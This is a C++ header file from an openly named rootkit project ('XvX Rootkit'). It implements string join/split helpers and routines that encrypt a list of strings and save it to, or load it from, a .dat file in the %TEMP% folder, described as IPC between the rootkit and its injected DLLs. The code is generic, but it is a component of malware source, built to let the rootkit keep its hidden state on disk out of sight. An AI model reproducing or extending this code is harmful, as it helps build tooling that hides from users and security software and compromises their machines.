/*
 * XvX Rootkit - IPC Objects Header
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * Shared memory IPC for communication between rootkit and injected DLLs.
 */

#ifndef IPCOBJECTS_FILE_H
#define IPCOBJECTS_FILE_H

#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include "Crypto.h"

inline std::wstring join(const std::vector<std::wstring> &vec, const std::wstring &delimiter)
{
    if (vec.empty())
        return L"";

    std::wstring result = vec[0];
    for (size_t i = 1; i < vec.size(); i++)
    {
        result += delimiter + vec[i];
    }
    return result;
}

inline std::vector<std::wstring> split(const std::wstring &str, const std::wstring &delimiter)
{
    std::vector<std::wstring> tokens;
    size_t start = 0;
    size_t end = str.find(delimiter);

    while (end != std::wstring::npos)
    {
        std::wstring token = str.substr(start, end - start);
        if (!token.empty())
        {
            tokens.push_back(token);
        }
        start = end + delimiter.length();
        end = str.find(delimiter, start);
    }

    std::wstring lastToken = str.substr(start);
    if (!lastToken.empty())
    {
        tokens.push_back(lastToken);
    }

    return tokens;
}

class Serialitzator
{
public:
    static void serializeVectorWString(const std::vector<std::wstring> &wstringVec, std::wstring fileName)
    {
        // Get the %TEMP% path
        WCHAR tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);

        std::wstring filePath = std::wstring(tempPath) + fileName + L".dat";

        // Concatenate vector into single string with delimiter
        std::wstring data = join(wstringVec, L"|");

        // Encryupt the data
        std::wstring encrypted = encryptForStorage(data);

        // Write to file
        std::wofstream file(filePath.c_str(), std::ios::binary);
        if (file.is_open())
        {
            file << encrypted;
            file.close();
        }
    }
};

inline std::vector<std::wstring> deserializeWStringVector(std::wstring fileName)
{
    // Get the %TEMP% path
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);

    std::wstring filePath = std::wstring(tempPath) + fileName + L".dat";

    // Read the file
    std::wifstream file(filePath.c_str(), std::ios::binary);
    if (!file.is_open())
    {
        // File does not exist, return empty vector
        return std::vector<std::wstring>();
    }

    std::wstringstream buffer;
    buffer << file.rdbuf();
    file.close();

    std::wstring encryptedData = buffer.str();

    if (encryptedData.empty())
    {
        return std::vector<std::wstring>();
    }

    // Decrypt the data
    std::wstring data = decryptFromStorage(encryptedData);

    if (data.empty())
    {
        return std::vector<std::wstring>();
    }

    // Split with delimiter
    return split(data, L"|");
}

#endif // IPCOBJECTS_FILE_H
